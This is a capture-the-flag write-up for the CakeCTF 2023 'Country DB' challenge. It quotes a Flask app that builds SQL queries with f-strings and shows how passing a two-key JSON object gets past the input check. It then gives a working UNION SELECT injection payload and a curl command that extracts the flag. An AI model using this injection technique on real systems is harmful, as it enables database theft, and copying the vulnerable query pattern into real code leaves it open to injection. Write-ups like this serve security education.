# Country DB

## Description

> Do you know which country code 'CA' and 'KE' are for?
>
> Search country codes [here](http://countrydb.2023.cakectf.com:8020/)!
>
> Attachments: country_db_fc1912477a433a93f7d75a9b80389582.tar.gz

<details><summary>Attachment file tree</summary>

```console
$ tree country_db
country_db
├── app.py
├── docker-compose.yml
├── Dockerfile
├── init_db.py
├── templates
│   └── index.html
└── uwsgi.ini

2 directories, 6 files
```

</details>

## Solution

Looking at the source code.

```python
# init_db.py

# (snip)

FLAG = os.getenv("FLAG", "FakeCTF{*** REDACTED ***}")

# (snip)

conn.execute("""CREATE TABLE flag (
  flag TEXT NOT NULL
);""")
conn.execute(f"INSERT INTO flag VALUES (?)", (FLAG,))

# (snip)
```

```python
# app.py

# (snip)

def db_search(code):
    with sqlite3.connect("database.db") as conn:
        cur = conn.cursor()
        print(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

# (snip)

@app.route("/api/search", methods=["POST"])
def api_search():
    req = flask.request.get_json()
    if "code" not in req:
        flask.abort(400, "Empty country code")

    code = req["code"]
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")
```

- The flag is in the flag table in DB
- The POST /api/search endpoint has the restriction that requect body `code` must be length 2 and should not contain a single quotes, but this can be bypassed with objects like `{"a":1,"b":2}`
- The Python `code` dict is embedded with f-string to create the SQL query. This can be exploited for SQL Injection.
- Create a payload to execute the SQL query `SELECT name FROM country WHERE code=UPPER('') UNION SELECT flag FROM flag;--` and get the flag.

Tested in Python Console:

```python
>>> code = {"') UNION SELECT flag FROM flag;--":1,"b":2}
>>> print(f"SELECT name FROM country WHERE code=UPPER('{code}')")
SELECT name FROM country WHERE code=UPPER('{"') UNION SELECT flag FROM flag;--": 1, 'b': 2}')
```

Exploit:

```console
$ curl http://localhost:8020/api/search -H "Content-Type: application/json" -d "{\"code\":{\"') UNION SELECT flag FROM flag;--\":1,\"b\":2}}"
{"name":"FakeCTF{*** REDACTED ***}"}
```
